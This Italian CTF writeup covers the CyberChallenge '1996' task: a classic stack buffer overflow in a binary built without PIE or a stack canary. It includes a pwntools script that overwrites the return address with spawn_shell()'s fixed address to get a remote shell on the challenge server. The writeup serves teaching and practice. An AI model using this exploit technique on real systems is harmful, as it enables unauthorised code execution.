# Writeup: SS_2.02 - 1996

## Descrizione
La challenge fornisce un semplice programma C/C++ (compilato con opzioni **-no-pie** e **-fno-stack-protector**) che:

1. Legge il nome di una variabile d'ambiente da input:
   ```cpp
   cin >> buf;
   ```
2. Stampa la variabile:
   ```cpp
   cout << buf << "=" << getenv(buf) << endl;
   ```
3. Non ci sono altre protezioni, e lo stack non è protetto da canary.

Il **main** contiene un buffer `buf[1024]`, ma nessun controllo sulla lunghezza dell’input. Ciò permette di **sovrascrivere** l’indirizzo di ritorno e forzare l’esecuzione della funzione `spawn_shell()`:

```cpp
void spawn_shell() {
    char* args[] = {(char*)"/bin/bash", NULL};
    execve("/bin/bash", args, NULL);
}
```

---

## Panoramica dell’Exlpoit

1. **Overflow dello stack**: Possiamo inserire più di 1024 byte e riscrivere l’indirizzo di ritorno della funzione `main`.
2. **Jump a `spawn_shell()`**: Modificando l’indirizzo di ritorno, puntiamo alla funzione `spawn_shell()` per ottenere una shell interattiva.

### Dettagli

- **No PIE**: L’indirizzo di `spawn_shell()` è statico e conosciuto (es. 0x400897).
- **No Stack Protector**: Nessun canary a bloccare l’overflow.
- **64-bit**: Per l’indirizzo, usiamo `p64(0x400897)` (little-endian, 8 byte).

---

## Codice di Exploit

```python
from pwn import *

host = '1996.challs.cyberchallenge.it'
port = 9121

# Connettiamoci al servizio remoto
conn = remote(host, port)

# Prepariamo il payload
# 1) Padding per sovrascrivere fino al return address
padding = b'A' * 1048

# 2) Indirizzo di spawn_shell() (64-bit, little-endian)
spawn_shell_addr = p64(0x400897)

# 3) Payload finale
payload = padding + spawn_shell_addr

# Invia il payload
conn.sendline(payload)

# Passa alla modalità interattiva per usare la shell
conn.interactive()
```

### Spiegazione dei Numeri
- **1048 byte di padding**: Bisogna determinare la distanza tra l’inizio di `buf` e l’indirizzo di ritorno. Se si tratta di 1024 per `buf`, più 8 per l’RBP e altri 8 per l’RIP, si arriva a 1040, 1048 o simili a seconda di come è compilato.  
  - Se 1048 funziona, allora sovrascrive correttamente l’indirizzo di ritorno.  
- **Indirizzo 0x400897**: Ricavato analizzando il binario (ad esempio con `objdump -d` o `nm`).

---

## Risultato

Dopo aver inviato il payload, il programma eseguirà `spawn_shell()` e otterremo una shell su `1996.challs.cyberchallenge.it`.

---

## Lezioni Apprese

1. **Buffer Overflow Classico**: L’assenza di canary e la disabilitazione di PIE consentono un exploit old-style, simile a quelli pre-ASLR.
2. **No PIE**: L’indirizzo delle funzioni è fisso, facilitando la costruzione di ROP o jump diretti.
3. **Overflow su Variabile Locale**: Inserendo input oltre 1024 byte, si sovrascrive lo stack frame e si modifica l’indirizzo di ritorno.
4. **Attenzione alle Strutture**: Anche un programma apparentemente semplice, che legge e stampa variabili d’ambiente, può essere vulnerabile se non limita la lunghezza dell’input.

---

*Writeup by Luca Crippa - Last Updated: 2024*
